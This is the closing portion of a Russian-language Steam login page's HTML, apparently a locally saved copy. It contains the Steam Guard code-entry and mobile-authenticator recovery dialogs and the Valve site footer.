					<div class="authcode_entry_box">
						<input class="authcode_entry_input authcode_placeholder" id="authcode" type="text" value="" placeholder="введите код здесь">

					</div>
				</div>
				<div id="authcode_help_supportlink">
					<a href="https://support.steampowered.com/kb_article.php?ref=4020-ALZM-5519" data-ajax="false" data-externallink="1">Свяжитесь со службой поддержки Steam для решения проблемы с доступом к аккаунту</a>
				</div>
			</div>
			<div class="modal_buttons" id="auth_buttonsets">
				<div class="auth_buttonset" id="auth_buttonset_entercode" style="display: none;">
					<div data-modalstate="submit" class="auth_button leftbtn">
						<div class="auth_button_h3">Отправить</div>
						<div class="auth_button_h5">мой код доступа</div>
					</div>
					<div data-modalstate="checkspam" class="auth_button">
						<div class="auth_button_h3">Какое сообщение?</div>
						<div class="auth_button_h5">Я не получил сообщение от службы поддержки Steam...</div>
					</div>
					<div style="clear: left;"></div>
				</div>
				<div class="auth_buttonset" id="auth_buttonset_checkspam" style="display: none;">
					<div data-modalstate="submit" class="auth_button leftbtn">
						<div class="auth_button_h3">Нашел!</div>
						<div class="auth_button_h5">и ввел мой код доступа выше</div>
					</div>
					<div data-modalstate="help" class="auth_button">
						<div class="auth_button_h3">До сих пор не нашел...</div>
						<div class="auth_button_h5">Я не получил сообщение от службы поддержки Steam...</div>
					</div>
					<div style="clear: left;"></div>
				</div>
				<div class="auth_buttonset" id="auth_buttonset_success" style="display: none;">
					<div class="auth_button auth_button_spacer">
					</div>
					<button type="button" data-modalstate="complete" class="auth_button" id="success_continue_btn">
						<div class="auth_button_h3">Перейти к Steam!</div>
						<div class="auth_button_h5">&nbsp;<br>&nbsp;</div>
					</button>
					<div style="clear: left;"></div>
				</div>
				<div class="auth_buttonset" id="auth_buttonset_incorrectcode" style="display: none;">
					<div data-modalstate="submit" class="auth_button leftbtn">
						<div class="auth_button_h3">Повторить попытку</div>
						<div class="auth_button_h5">Я проверил код доступа выше</div>
					</div>
					<div data-modalstate="help" class="auth_button">
						<div class="auth_button_h3">Помогите</div>
						<div class="auth_button_h5">Мне нужна помощь службы поддержки Steam...</div>
					</div>
					<div style="clear: left;"></div>
				</div>
				<div class="auth_buttonset" id="auth_buttonset_waiting" style="display: none;">
				</div>
			</div>
			<div style="" id="auth_details_computer_name" class="auth_details_messages">
				Чтобы без проблем узнать этот браузер среди устройств, прошедших проверку Steam Guard, дайте ему подходящее имя длиной не меньше шести символов.				<div id="friendly_name_box" class="friendly_name_box">
					<input class="authcode_entry_input authcode_placeholder" id="friendlyname" type="text" placeholder="введите название">
				</div>
			</div>
		</form>
	</div>

	<div class="login_modal loginIPTModal" style="display: none">
		<div class="auth_message_area">
			<div class="auth_icon ipt_icon">
			</div>
			<div class="auth_messages">
				<div class="auth_message">
					<div class="auth_modal_h1">Извините</div>
					<p>Доступ к аккаунту не может быть получен без дополнительного разрешения.</p>
				</div>
			</div>
		</div>
		<div class="auth_details_messages">
			<div class="auth_details">
				Пожалуйста, обратитесь в службу поддержки Steam. Решение проблем с доступом к аккаунту — наша основная задача.			</div>
		</div>
		<div class="authcode_entry_area">
		</div>
		<div class="modal_buttons">
			<div class="auth_buttonset">
				<a href="https://support.steampowered.com/kb_article.php?ref=9400-IPAX-9398&amp;auth=e39b5c227cffc8ae65414aba013e5fef" class="auth_button leftbtn" data-ajax="false" data-externallink="1">
					<div class="auth_button_h3">Узнать больше</div>
					<div class="auth_button_h5">о технологии защиты личности Intel®</div>
				</a>
				<a href="https://support.steampowered.com/" class="auth_button" data-ajax="false" data-externallink="1">
					<div class="auth_button_h3">Помогите</div>
					<div class="auth_button_h5">Мне нужна помощь службы поддержки Steam...</div>
				</a>
				<div style="clear: left;"></div>
			</div>
		</div>
	</div>



	<div class="login_modal loginTwoFactorCodeModal" style="display: none">
		<div class="twofactorauth_message_area">
			<div id="login_twofactorauth_icon" class="auth_icon auth_icon_key">
			</div>
			<div class="twofactorauth_messages" id="login_twofactorauth_messages">
				<div class="twofactorauth_message" id="login_twofactorauth_message_entercode" style="display: none;">
					<div class="auth_modal_h1">Здравствуйте, <span id="login_twofactorauth_message_entercode_accountname"></span>!</div>
					<p>Этот аккаунт находится под защитой мобильного аутентификатора Steam.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_incorrectcode" style="display: none;">
					<div class="auth_modal_h1">Ой!</div>
					<p>Извините, <br>но код неверен…</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp" style="display: none;">
					<div class="auth_modal_h1">Позвольте помочь вам!</div>
					<p>Мы сожалеем, что у вас возникли трудности. Мы знаем, что ваш аккаунт Steam важен для вас, и поэтому мы хотим помочь вам защитить его от посторонних лиц.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_sms_remove" style="display: none;">
					<div class="auth_modal_h1">Подтвердите владение аккаунтом</div>
					<p>Мы отправим СМС с кодом восстановления аккаунта на номер, заканчивающийся на <span id="login_twofactorauth_selfhelp_sms_remove_last_digits"></span>. После того как вы введете код, мы удалим аутентификатор с вашего аккаунта, и вы будете получать коды Steam Guard по электронной почте.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_sms_remove_entercode" style="display: none;">
					<div class="auth_modal_h1">Подтвердите владение аккаунтом</div>
					<p>Мы отправили СМС с кодом подтверждения на ваш номер телефона, который заканчивается на <span id="login_twofactorauth_selfhelp_sms_remove_entercode_last_digits"></span>. Введите код ниже, чтобы мы могли удалить мобильный аутентификатор с вашего аккаунта.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_sms_remove_incorrectcode" style="display: none;">
					<div class="auth_modal_h1">Ой!</div>
					<p>Извините, <br>но код неверен…</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_twofactor_removed" style="display: none;">
					<div class="auth_modal_h1">Готово!</div>
					<p>Мы открепили аутентификатор от вашего аккаунта. При следующем входе вам потребуется код Steam Guard, отправленный на вашу электронную почту.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_twofactor_replaced" style="display: none;">
					<div class="auth_modal_h1">Готово!</div>
					<p>Теперь вы будете получать коды мобильного аутентификатора только на этот телефон.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_nosms" style="display: none;">
					<div class="auth_modal_h1">У вас есть код восстановления?</div>
					<p>К вашему аккаунту Steam не привязан номер телефона, поэтому подтвердить владение аккаунтом с помощью СМС невозможно. Может, у вас остался код восстановления, который вы записали при добавлении мобильного аутентификатора? Он начинается с буквы R.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode" style="display: none;">
					<div class="auth_modal_h1">Введите код восстановления</div>
					<p>Пожалуйста, введите код восстановления ниже. Он начинается с буквы R.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode_incorrectcode" style="display: none;">
					<div class="auth_modal_h1">Ой!</div>
					<p>Извините, <br>но код неверен…</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode_incorrectcode_exhausted" style="display: none;">
					<div class="auth_modal_h1">Ой!</div>
					<p>Извините, <br>но код неверен…</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode_message" style="display: none;">
					<div class="auth_modal_h1">Ой!</div>
					<p>Извините, <br>но код неверен…</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_couldnthelp" style="display: none;">
					<div class="auth_modal_h1">Позвольте помочь вам!</div>
					<p>Если вы потеряли доступ к телефону, номеру телефона, привязанному к аккаунту, и не имеете кода восстановления, который записали при добавлении мобильного аутентификатора, свяжитесь со службой поддержки Steam для восстановления доступа к аккаунту.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_help" style="display: none;">
					<div class="auth_modal_h1">Позвольте помочь вам!</div>
					<p>Мы сожалеем, что у вас возникли трудности. Мы знаем, что ваш аккаунт Steam важен для вас, и поэтому мы хотим помочь вам защитить его от посторонних лиц.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_failure" style="display: none;">
					<div class="auth_modal_h1">Извините!</div>
					<p>При обработке вашего запроса произошла ошибка.</p>
				</div>
			</div>
		</div>
		<div id="login_twofactorauth_details_messages" class="twofactorauth_details_messages">
			<div class="twofactorauth_details" id="login_twofactorauth_details_entercode" style="display: none;">
				Введите код из мобильного приложения Steam:			</div>
			<div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp" style="display: none;">
				Если вы потеряли доступ к мобильному устройству или удалили приложение Steam и больше не получаете коды, то вы можете удалить мобильный аутентификатор со своего аккаунта. Это снизит уровень безопасности, поэтому мы рекомендуем добавить мобильный аутентификатор на новом устройстве.			</div>
			<div class="twofactorauth_details" id="login_twofactorauth_details_help" style="display: none;">
				Пожалуйста, обратитесь в службу поддержки Steam.			</div>
			<div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp_failure" style="display: none;">
			</div>
			<div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp_rcode_incorrectcode" style="display: none;">
			</div>
			<div class="twofactorauth_details" id="login_twofactorauth_details_selfhelp_rcode_incorrectcode_exhausted" style="display: none;">
			</div>
		</div>
		<div class="twofactorauthcode_entry_area">
			<div id="login_twofactor_authcode_entry">
				<div class="twofactorauthcode_entry_box">
					<form>
						<input class="twofactorauthcode_entry_input authcode_placeholder" id="twofactorcode_entry" type="text" placeholder="введите код здесь">
					</form>
				</div>
			</div>
			<div id="login_twofactor_authcode_help_supportlink">
				<a href="https://support.steampowered.com/kb_article.php?ref=4020-ALZM-5519">
					Свяжитесь со службой поддержки Steam для решения проблемы с доступом к аккаунту				</a>
			</div>
		</div>
		<div class="modal_buttons" id="login_twofactorauth_buttonsets">
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_entercode" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="submit">
					<div class="auth_button_h3">Подтвердить</div>
					<div class="auth_button_h5">код аутентификатора</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp">
					<div class="auth_button_h3">Помогите</div>
					<div class="auth_button_h5">У меня больше нет доступа к кодам мобильного аутентификатора</div>
				</div>
				<div style="clear: left;"></div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_incorrectcode" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="submit">
					<div class="auth_button_h3">Повторить попытку</div>
					<div class="auth_button_h5">Я проверил код аутентификатора выше</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp">
					<div class="auth_button_h3">Помогите</div>
					<div class="auth_button_h5">Мне нужна помощь службы поддержки Steam…</div>
				</div>
				<div style="clear: left;"></div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_start">
					<div class="auth_button_h3" style="font-size: 16px;">Отвязать аутентификатор</div>
					<div class="auth_button_h5">и снова получать коды по электронной почте</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_sms_reset_start">
					<div class="auth_button_h3">Использовать это устройство</div>
					<div class="auth_button_h5">и получать коды аутентификации из приложения</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_sms_remove" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_sendcode">
					<div class="auth_button_h3">Хорошо!</div>
					<div class="auth_button_h5">Отправьте мне СМС</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_nosms">
					<div class="auth_button_h3">Не надо,</div>
					<div class="auth_button_h5">у меня нет доступа к этому номеру телефона</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_sms_remove_entercode" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_checkcode">
					<div class="auth_button_h3">Подтвердить</div>
					<div class="auth_button_h5">Я ввел код выше</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_nosms">
					<div class="auth_button_h3">Помогите,</div>
					<div class="auth_button_h5">сообщение не приходит</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_sms_remove_incorrectcode" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_checkcode">
					<div class="auth_button_h3">Подтвердить</div>
					<div class="auth_button_h5">Я проверил код. Попробуем еще раз.</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_nosms">
					<div class="auth_button_h3">Помогите,</div>
					<div class="auth_button_h5">сообщение не приходит</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_twofactor_removed" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_complete">
					<div class="auth_button_h3">Войти</div>
					<div class="auth_button_h5">и открепить мобильный аутентификатор</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_twofactor_replaced" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_sms_remove_complete">
					<div class="auth_button_h3">Войти</div>
					<div class="auth_button_h5">в мобильное приложение Steam</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_nosms" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_rcode">
					<div class="auth_button_h3">Да,</div>
					<div class="auth_button_h5">у меня есть код восстановления, начинающийся на R</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_couldnthelp">
					<div class="auth_button_h3">Нет,</div>
					<div class="auth_button_h5">у меня нет такого кода</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_rcode" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_rcode_checkcode">
					<div class="auth_button_h3">Отправить</div>
					<div class="auth_button_h5">код восстановления</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_couldnthelp">
					<div class="auth_button_h3">Помогите!</div>
					<div class="auth_button_h5">Кажется, мне нужно обратиться в поддержку Steam…</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_rcode_incorrectcode" style="display: none;">
				<div class="auth_button leftbtn" data-modalstate="selfhelp_rcode_checkcode">
					<div class="auth_button_h3">Отправить</div>
					<div class="auth_button_h5">Я проверил код. Попробуем еще раз.</div>
				</div>
				<div class="auth_button" data-modalstate="selfhelp_couldnthelp">
					<div class="auth_button_h3">Помогите!</div>
					<div class="auth_button_h5">Кажется, мне нужно обратиться в поддержку Steam…</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_rcode_incorrectcode_exhausted" style="display: none;">
				<div class="auth_button" data-modalstate="selfhelp_couldnthelp">
					<div class="auth_button_h3">Помогите!</div>
					<div class="auth_button_h5">Кажется, мне нужно обратиться в поддержку Steam…</div>
				</div>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_selfhelp_couldnthelp" style="display: none;">
				<a class="auth_button leftbtn" href="https://support.steampowered.com/newticket.php">
					<div class="auth_button_h3">Свяжитесь с нами</div>
					<div class="auth_button_h5">для помощи с доступом к аккаунту</div>
				</a>
			</div>
			<div class="auth_buttonset" id="login_twofactorauth_buttonset_waiting" style="display: none;">
			</div>
		</div>
	</div>
</div>

<!-- Footer -->
<div id="footer_spacer" class=""></div>
<div id="footer" class="">
<div class="footer_content">
	<div class="rule"></div>

	<div id="footer_nav">

		
					<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_genre_pulldown">
					<span>ТОВАРЫ ПО ЖАНРАМ</span>
				</span>
			<div class="popup_block_new" id="footer_genre_dropdown" style="display: none;">
				<div class="popup_body popup_menu">
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Free%20to%20Play?snr=1_44_44__20">
							Бесплатно						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Action?snr=1_44_44__20">
							Экшены						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Adventure?snr=1_44_44__20">
							Приключенческие игры						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Strategy?snr=1_44_44__20">
							Стратегии						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/RPG?snr=1_44_44__20">
							Ролевые игры						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Indie?snr=1_44_44__20">
							Инди						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Massively%20Multiplayer?snr=1_44_44__20">
							Многопользовательские игры						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Casual?snr=1_44_44__20">
							Казуальные игры						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Simulation?snr=1_44_44__20">
							Симуляторы						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Racing?snr=1_44_44__20">
							Гонки						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Sports?snr=1_44_44__20">
							Спортивные игры						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Accounting?snr=1_44_44__20">
							Бухгалтерия						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Animation%20%26%20Modeling?snr=1_44_44__20">
							Анимация и моделирование						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Audio%20Production?snr=1_44_44__20">
							Работа со звуком						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Design%20%26%20Illustration?snr=1_44_44__20">
							Дизайн						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Education?snr=1_44_44__20">
							Обучение						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Photo%20Editing?snr=1_44_44__20">
							Обработка фото						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Software%20Training?snr=1_44_44__20">
							Обучение работе с ПО						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Utilities?snr=1_44_44__20">
							Утилиты						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Video%20Production?snr=1_44_44__20">
							Создание видео						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Web%20Publishing?snr=1_44_44__20">
							Веб-разработка						</a>
											<a class="popup_menu_item" href="http://store.steampowered.com/genre/Early%20Access?snr=1_44_44__20">
							Ранний доступ						</a>
									</div>
			</div>
					
			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_steam_pulldown">
				<span>О STEAM</span>
			</span>
		<div class="popup_block_new" id="footer_steam_dropdown" style="display: none;">
						<div class="popup_body popup_menu">
				<a class="popup_menu_item" href="http://store.steampowered.com/about/?snr=1_44_44__22">
					Что такое Steam?				</a>
				<!--
					<a class="popup_menu_item" href="">
						Загрузить Steam					</a>
					-->
				<a class="popup_menu_item" target="_blank" href="https://support.steampowered.com/kb_article.php?p_faqid=549#gifts">
					Подарки в Steam				</a>
				<a class="popup_menu_item" href="https://steamcommunity.com/?snr=1_44_44__22">
					Сообщество Steam				</a>
			</div>
					</div>
	
			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_valve_pulldown">
				<span>О VALVE</span>
			</span>
		<div class="popup_block_new" id="footer_valve_dropdown" style="display: none;">
			<div class="popup_body popup_menu">
				<a class="popup_menu_item" target="_blank" href="http://www.valvesoftware.com/about.html">
					О Valve				</a>
				<a class="popup_menu_item" target="_blank" href="http://www.valvesoftware.com/business/">
					Решения для бизнеса				</a>
				<a class="popup_menu_item" target="_blank" href="http://www.steampowered.com/steamworks/">
					Steamworks				</a>
				<a class="popup_menu_item" target="_blank" href="http://www.valvesoftware.com/jobs.html">
					Вакансии				</a>
			</div>
		</div>
			
			
			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_help_pulldown">
				<span>ПОМОЩЬ</span>
			</span>
		<div class="popup_block_new" id="footer_help_dropdown" style="display: none;">
						<div class="popup_body popup_menu">
				<a class="popup_menu_item" href="https://help.steampowered.com/?snr=1_44_44__23">
					Служба поддержки				</a>
				<a class="popup_menu_item" target="_blank" href="http://store.steampowered.com/forums/?snr=1_44_44__23">
					Форумы				</a>
				<a class="popup_menu_item" target="_blank" href="http://store.steampowered.com/stats/?snr=1_44_44__23">
					Статистики				</a>
			</div>
					</div>

			
			<span class="pulldown btnv6_blue_hoverfade btn_small" id="footer_feeds_pulldown">
				<span>ЛЕНТЫ НОВОСТЕЙ</span>
			</span>
		<div class="popup_block_new" id="footer_feeds_dropdown" style="display: none;">
			<div class="popup_body popup_menu">
				<a class="popup_menu_item" href="http://store.steampowered.com/feeds/news.xml">
					<img src="./login_files/ico_rss2.gif" width="13" height="13" border="0" alt="" align="top">&nbsp;&nbsp;Новости Steam				</a>
				<a class="popup_menu_item" href="http://store.steampowered.com/feeds/newreleases.xml">
					<img src="./login_files/ico_rss2.gif" width="13" height="13" border="0" alt="" align="top">&nbsp;&nbsp;Релизы игр				</a>
				<a class="popup_menu_item" href="http://store.steampowered.com/feeds/daily_deals.xml">
					<img src="./login_files/ico_rss2.gif" width="13" height="13" border="0" alt="" align="top">&nbsp;&nbsp;Предложения дня				</a>
			</div>
		</div>
		<div style="clear: left;"></div>

		<script type="text/javascript">
			RegisterFlyout( 'footer_genre_pulldown', 'footer_genre_dropdown', null, null, true );
			RegisterFlyout( 'footer_steam_pulldown', 'footer_steam_dropdown', null, null, true );
			RegisterFlyout( 'footer_valve_pulldown', 'footer_valve_dropdown', null, null, true );
			RegisterFlyout( 'footer_help_pulldown', 'footer_help_dropdown', null, null, true );
			RegisterFlyout( 'footer_feeds_pulldown', 'footer_feeds_dropdown', null, null, true );
		</script>
	</div>

	<br>

    <div class="rule"></div>
    <div id="footer_logo"><a target="_blank" href="http://www.valvesoftware.com/"><img src="./login_files/logo_valve_footer.png" alt="Valve Software" border="0"></a></div>
    <div id="footer_text">
        <div>© 2016 Valve Corporation. Все права защищены. Все торговые марки являются собственностью соответствующих владельцев в США и других странах.</div>
        <div>НДС включен во все цены, где он применим.&nbsp;&nbsp;

            <a target="_blank" href="http://store.steampowered.com/privacy_agreement/">Политика конфиденциальности</a>
            &nbsp; | &nbsp;
            <a target="_blank" href="http://www.valvesoftware.com/legal.htm">Правовая информация</a>
            &nbsp; | &nbsp;
            <a target="_blank" href="http://store.steampowered.com/subscriber_agreement/">Соглашение подписчика службы Steam</a>
            &nbsp; | &nbsp;
            <a target="_blank" href="http://store.steampowered.com/steam_refunds/">Возвраты</a>

        </div>
					<div class="responsive_optin_link">
				<div class="btn_medium btnv6_grey_black" onclick="Responsive_RequestMobileView()">
					<span>Мобильная версия</span>
				</div>
			</div>
		    </div>



    <div style="clear: left;"></div>

    <div class="rule"></div>

    <div class="valve_links">
        <a target="_blank" href="http://www.valvesoftware.com/about.html">О Valve</a>
        &nbsp; | &nbsp;<a target="_blank" href="http://www.valvesoftware.com/business/">Решения для бизнеса</a>
        &nbsp; | &nbsp;<a target="_blank" href="http://www.steampowered.com/steamworks/">Steamworks</a>
        &nbsp; | &nbsp;<a target="_blank" href="http://www.valvesoftware.com/jobs.html">Вакансии</a>
        &nbsp; | &nbsp;<a target="_blank" href="http://steamcommunity.com/greenlight">Дистрибуция Steam</a>
		&nbsp; | &nbsp;<a target="_blank" href="http://www.facebook.com/Steam"><img src="./login_files/ico_facebook.gif"> Steam</a>
		&nbsp; | &nbsp;<a target="_blank" href="http://twitter.com/steam_games"><img src="./login_files/ico_twitter.gif"> @steam_games</a>
    </div>

</div>
</div><!-- End Footer -->



<div class="miniprofile_hover" style="display: none;"><div class="shadow_ul"></div><div class="shadow_top"></div><div class="shadow_ur"></div><div class="shadow_left"></div><div class="shadow_right"></div><div class="shadow_bl"></div><div class="shadow_bottom"></div><div class="shadow_br"></div><div class="miniprofile_hover_inner shadow_content"></div><div class="hover_arrow left miniprofile_arrow"><div class="miniprofile_arrow_inner"></div></div><div class="hover_arrow right miniprofile_arrow"><div class="miniprofile_arrow_inner"></div></div></div></body></html>
